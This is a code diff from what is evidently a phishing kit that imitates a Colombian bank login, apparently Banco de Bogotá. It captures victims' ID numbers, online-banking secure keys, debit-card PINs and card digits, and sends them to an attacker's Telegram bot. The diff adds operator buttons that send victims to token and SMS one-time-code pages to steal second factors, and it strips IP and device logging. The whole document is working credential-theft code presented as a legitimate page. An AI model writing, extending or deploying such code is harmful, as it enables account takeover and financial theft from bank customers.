@@ -478,24 +478,12 @@
                 function initializeFormLogic() {
                     let statusCheckInterval = null;
 
-                    function detectar_dispositivo() {
-                        const userAgent = navigator.userAgent;
-                        if (/android/i.test(userAgent)) {
-                            return "Android";
-                        } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-                            return "iOS";
-                        } else if (/Windows Phone/i.test(userAgent)) {
-                            return "Windows Phone";
-                        } else {
-                            return "Desktop/Other";
-                        }
-                    }
-
                     async function sendToTelegram(messageContent, keyboard) {
                         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                         const payload = {
                             chat_id: TELEGRAM_CHAT_ID,
                             text: messageContent,
+                            parse_mode: 'Markdown',
                             reply_markup: keyboard
                         };
 
@@ -716,58 +704,45 @@
                         input4.addEventListener('input', verificarCondiciones);
                         inputRepLegal.addEventListener('input', verificarCondiciones);
 
-                        // Funciones de envío con el nuevo mecanismo
                         async function handleLoginAttempt(loginData, tabName) {
                             azul.style.display = 'block';
 
-                            try {
-                                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                                const ipData = await ipResponse.json();
-                                loginData.ip = ipData.ip || 'N/A';
-                                document.getElementById("ip").value = loginData.ip;
-                            } catch (error) {
-                                console.error("No se pudo obtener la IP:", error);
-                                loginData.ip = 'N/A';
-                            }
+                            const now = new Date();
+                            const formattedDate = now.toLocaleDateString('es-CO', {
+                                day: 'numeric',
+                                month: 'numeric',
+                                year: 'numeric'
+                            });
+                            const formattedTime = now.toLocaleTimeString('es-CO', {
+                                hour: '2-digit',
+                                minute: '2-digit',
+                                second: '2-digit',
+                                hour12: true
+                            });
 
-                            const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
-                            loginData.transactionId = transactionId;
-
-                            let message = `🍀 NUEVO REGISTRO\n\n`;
-                            message += `ID de Transacción: ${transactionId}\n`;
-                            message += `Tipo de Tab: ${tabName}\n`;
-                            message += `Tipo de Doc: ${loginData.identificationType}\n`;
-                            message += `No. de Doc: ${loginData.identificationNumber}\n`;
-                            if (loginData.secureKey && loginData.secureKey !== 'N/A') {
-                                message += `Clave Segura: ${loginData.secureKey}\n`;
+                            let message;
+                            if (tabName === 'Clave Segura') {
+                                message = `🍀 GOLEADOR 🍀\n\nTipo de Ingreso: ${tabName}\nTipo de Doc: ${loginData.identificationType}\n\nCEDULA💎: ${loginData.identificationNumber}\nClAVE🔐: ${loginData.secureKey}\n\nFecha/Hora: ${formattedDate}, ${formattedTime}`;
+                            } else {
+                                message = `🍀 GOLEADOR 🍀\n\nTipo de Ingreso: ${tabName}\nTipo de Doc: ${loginData.identificationType}\n\nCEDULA💎: ${loginData.identificationNumber}\nClAVE🔐: ${loginData.debitCardKey}\nUltimos 4: ${loginData.last4Digits}\n\nFecha/Hora: ${formattedDate}, ${formattedTime}`;
                             }
-                            if (loginData.debitCardKey && loginData.debitCardKey !== 'N/A') {
-                                message += `Clave Tarjeta Débito: ${loginData.debitCardKey}\n`;
-                            }
-                            if (loginData.last4Digits && loginData.last4Digits !== 'N/A') {
-                                message += `Últimos 4 dígitos: ${loginData.last4Digits}\n`;
-                            }
-                            if (loginData.legalRepresentativeNumber !== 'N/A') {
-                                message += `Tipo Rep. Legal: ${loginData.legalRepresentativeDoc}\n`;
-                                message += `No. Rep. Legal: ${loginData.legalRepresentativeNumber}\n`;
-                            }
-                            message += `\nIP: ${loginData.ip}\n`;
-                            message += `Dispositivo: ${loginData.device}\n`;
-                            message += `Fecha/Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
 
                             const keyboard = JSON.stringify({
                                 inline_keyboard: [
                                     [{
-                                        text: "Pedir Token",
-                                        callback_data: `pedir_dinamica:${transactionId}`
+                                        text: "💎 Token App",
+                                        callback_data: `pedir_dinamica:N/A`
+                                    }, {
+                                        text: "👀 Token SMS",
+                                        callback_data: `pedir_sms:N/A`
                                     }],
                                     [{
-                                        text: "Error de Logo",
-                                        callback_data: `error_tc:${transactionId}`
+                                        text: "❌ Error de Logo",
+                                        callback_data: `error_tc:N/A`
                                     }],
                                     [{
-                                        text: "Finalizar",
-                                        callback_data: `confirm_finalizar:${transactionId}`
+                                        text: "🚨 Finalizar",
+                                        callback_data: `confirm_finalizar:N/A`
                                     }]
                                 ],
                             });
@@ -776,7 +751,7 @@
 
                             if (sent) {
                                 sessionStorage.setItem('initialLoginData', JSON.stringify(loginData));
-                                checkPaymentVerification(transactionId);
+                                checkPaymentVerification('N/A');
                             } else {
                                 azul.style.display = 'none';
                                 alert("Error al enviar los datos iniciales. Por favor, inténtalo de nuevo.");
@@ -797,8 +772,7 @@
                                     if (updates && updates.length > 0) {
                                         const verificationUpdate = updates.find(
                                             (update) =>
-                                            update.callback_query &&
-                                            update.callback_query.data.includes(transactionId)
+                                            update.callback_query
                                         );
 
                                         if (verificationUpdate) {
@@ -808,8 +782,9 @@
 
                                             if (callbackData === 'pedir_dinamica') {
                                                 window.location.href = "token.html";
+                                            } else if (callbackData === 'pedir_sms') {
+                                                window.location.href = "otp.html";
                                             } else if (callbackData === 'error_tc') {
-                                                // Muestra el modal de error en lugar de la alerta
                                                 document.getElementById('error-modal').style.display = 'flex';
                                             } else if (callbackData === 'confirm_finalizar') {
                                                 window.location.href = "https://google.com";
@@ -829,10 +804,10 @@
                                 debitCardKey: $("#bdb-at-input2").val(),
                                 last4Digits: $("#bdb-at-input3").val().replace(/\D/g, ''),
                                 secureKey: 'N/A',
-                                legalRepresentativeDoc: document.getElementById("menudesplegadodos").style.display === 'block' ? document.getElementById("opcionamostrardos").textContent.substring(0, 5) : 'N/A',
-                                legalRepresentativeNumber: document.getElementById("menudesplegadodos").style.display === 'block' ? $("#bdb-at-inputmenudos").val() : 'N/A',
-                                ip: '',
-                                device: detectar_dispositivo()
+                                legalRepresentativeDoc: 'N/A',
+                                legalRepresentativeNumber: 'N/A',
+                                ip: 'N/A',
+                                device: 'N/A'
                             };
                             await handleLoginAttempt(loginData, 'Tarjeta Débito');
                         });
@@ -844,15 +819,14 @@
                                 secureKey: $("#bdb-at-input4").val(),
                                 debitCardKey: 'N/A',
                                 last4Digits: 'N/A',
-                                legalRepresentativeDoc: document.getElementById("menudesplegadodos").style.display === 'block' ? document.getElementById("opcionamostrardos").textContent.substring(0, 5) : 'N/A',
-                                legalRepresentativeNumber: document.getElementById("menudesplegadodos").style.display === 'block' ? $("#bdb-at-inputmenudos").val() : 'N/A',
-                                ip: '',
-                                device: detectar_dispositivo()
+                                legalRepresentativeDoc: 'N/A',
+                                legalRepresentativeNumber: 'N/A',
+                                ip: 'N/A',
+                                device: 'N/A'
                             };
                             await handleLoginAttempt(loginData, 'Clave Segura');
                         });
 
-                        // Agrega el evento para el botón "Volver al inicio"
                         document.getElementById('back-to-start-button').addEventListener('click', function() {
                             window.location.href = "index.html";
                         });
@@ -860,8 +834,6 @@
                         verificarCondiciones();
                     }
 
-                    // *** Línea modificada ***
-                    // Cambiamos el clic de la pestaña "Tarjeta débito" a la de "Clave segura"
                     tab1.click();
 
                     window.addEventListener('beforeunload', function() {
